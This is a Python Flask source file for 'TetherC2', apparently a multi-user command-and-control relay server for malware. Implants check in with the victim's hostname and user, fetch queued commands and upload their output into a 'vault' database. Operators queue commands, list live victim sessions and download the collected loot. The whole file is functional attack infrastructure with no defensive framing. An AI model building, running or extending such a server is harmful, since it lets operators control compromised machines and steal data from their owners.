# relay_server.py (Authoritative Multi-User Backend)
from flask import Flask, request, jsonify
import time
import threading
from werkzeug.security import generate_password_hash, check_password_hash
import sqlite3
import json

# --- Database Class ---
class DatabaseManager:
    def __init__(self, db_file="tether_global.db"):
        self.conn = sqlite3.connect(db_file, check_same_thread=False)
        self.conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, password_hash TEXT NOT NULL)")
        self.conn.execute("CREATE TABLE IF NOT EXISTS sessions (session_id TEXT PRIMARY KEY, owner_username TEXT NOT NULL, metadata TEXT, FOREIGN KEY (owner_username) REFERENCES users(username))")
        self.conn.execute("CREATE TABLE IF NOT EXISTS vault (session_id TEXT, module_name TEXT, data TEXT, PRIMARY KEY (session_id, module_name))")
    
    def create_user(self, username, password_hash):
        try:
            self.conn.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)", (username, password_hash))
            self.conn.commit()
            return True
        except sqlite3.IntegrityError:
            return False
            
    def get_user(self, username):
        cursor = self.conn.cursor()
        cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
        return cursor.fetchone()

    def create_or_update_session(self, session_id, owner_username, metadata):
        self.conn.execute("INSERT OR REPLACE INTO sessions (session_id, owner_username, metadata) VALUES (?, ?, ?)", (session_id, owner_username, json.dumps(metadata)))
        self.conn.commit()
        
    def get_sessions_for_user(self, username):
        cursor = self.conn.cursor()
        cursor.execute("SELECT session_id, metadata FROM sessions WHERE owner_username = ?", (username,))
        return {row[0]: json.loads(row[1]) for row in cursor.fetchall()}

    def save_vault_data(self, session_id, module_name, data):
        self.conn.execute("INSERT OR REPLACE INTO vault (session_id, module_name, data) VALUES (?, ?, ?)", (session_id, module_name, json.dumps(data)))
        self.conn.commit()

    def load_vault_data_for_user(self, username):
        user_sessions = self.get_sessions_for_user(username)
        vault_data = {}
        for session_id, metadata in user_sessions.items():
            vault_data[session_id] = {"metadata": metadata}

        if not user_sessions:
            return {}
            
        session_ids_placeholder = ','.join('?' for _ in user_sessions)
        query = f"SELECT session_id, module_name, data FROM vault WHERE session_id IN ({session_ids_placeholder})"
        
        for session_id, module_name, data_json in self.conn.execute(query, tuple(user_sessions.keys())):
            if session_id in vault_data:
                vault_data[session_id][module_name] = json.loads(data_json)
        return vault_data

app = Flask(__name__)
db = DatabaseManager()

# --- In-Memory State ---
command_queue = {}
response_queue = {}
active_sessions = {}
cmd_lock = threading.Lock()
res_lock = threading.Lock()
ses_lock = threading.Lock()

# --- Authentication Endpoints ---
@app.route('/auth/register', methods=['POST'])
def register():
    data = request.json
    username, password = data.get('username'), data.get('password')
    if not all([username, password]) or len(password) < 4:
        return jsonify({"success": False, "error": "Username and a password (min 4 chars) are required."}), 400
    if db.create_user(username, generate_password_hash(password)):
        return jsonify({"success": True, "message": "Account created successfully."})
    else:
        return jsonify({"success": False, "error": "Username already exists."}), 409

@app.route('/auth/login', methods=['POST'])
def login():
    data = request.json
    username, password = data.get('username'), data.get('password')
    user = db.get_user(username)
    if user and check_password_hash(user[1], password):
        return jsonify({"success": True, "username": user[0]})
    else:
        return jsonify({"success": False, "error": "Invalid username or password."}), 401

# --- Implant Endpoints ---
@app.route('/implant/hello', methods=['POST'])
def handle_implant_hello():
    data = request.json
    session_id, c2_user = data.get("session_id"), data.get("c2_user")
    if not all([session_id, c2_user]):
        return jsonify({"error": "session_id and c2_user are required"}), 400
    
    with ses_lock:
        db.create_or_update_session(session_id, c2_user, {"hostname": data.get("hostname"), "user": data.get("user")})
        active_sessions[session_id] = {"owner": c2_user, "last_seen": time.time(), "hostname": data.get("hostname"), "user": data.get("user")}
    
    if "results" in data:
        for result in data.get("results", []):
            if "command" in result and "output" in result:
                db.save_vault_data(session_id, result["command"], result["output"])
    
    with cmd_lock:
        commands_to_execute = command_queue.get(c2_user, {}).pop(session_id, [])
        
    return jsonify({"commands": commands_to_execute})

@app.route('/implant/response', methods=['POST'])
def handle_implant_response():
    data = request.json
    session_id = data.get("session_id")
    with ses_lock:
        session_info = active_sessions.get(session_id)
    if session_info:
        with res_lock:
            response_queue.setdefault(session_info["owner"], {}).setdefault(session_id, []).append(data)
    return jsonify({"status": "ok"})

# --- C2 Controller Endpoints ---
@app.route('/c2/task', methods=['POST'])
def handle_c2_task():
    data = request.json
    username, session_id, command = data.get("username"), data.get("session_id"), data.get("command")
    if not all([username, session_id, command]):
        return jsonify({"status": "error", "message": "Missing username, session_id, or command"}), 400
    with cmd_lock:
        command_queue.setdefault(username, {}).setdefault(session_id, []).append(command)
    return jsonify({"status": "ok"})

@app.route('/c2/discover', methods=['POST'])
def discover_sessions():
    username = request.json.get("username")
    user_sessions = {}
    with ses_lock:
        for sid, data in active_sessions.items():
            if data["owner"] == username and (time.time() - data["last_seen"]) < 40: # Increased timeout
                user_sessions[sid] = {"hostname": data["hostname"], "user": data["user"]}
    return jsonify({"sessions": user_sessions})
    
@app.route('/c2/get_responses', methods=['POST'])
def get_c2_responses():
    username, session_id = request.json.get("username"), request.json.get("session_id")
    with res_lock:
        responses = response_queue.get(username, {}).pop(session_id, [])
    return jsonify({"responses": responses})

@app.route('/c2/get_all_vault_data', methods=['POST'])
def get_all_vault_data():
    username = request.json.get("username")
    if not username:
        return jsonify({"success": False, "error": "Username is required"}), 400
    vault_data = db.load_vault_data_for_user(username)
    return jsonify({"success": True, "data": vault_data})

@app.route('/')
def index():
    return "TetherC2 Relay is operational."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)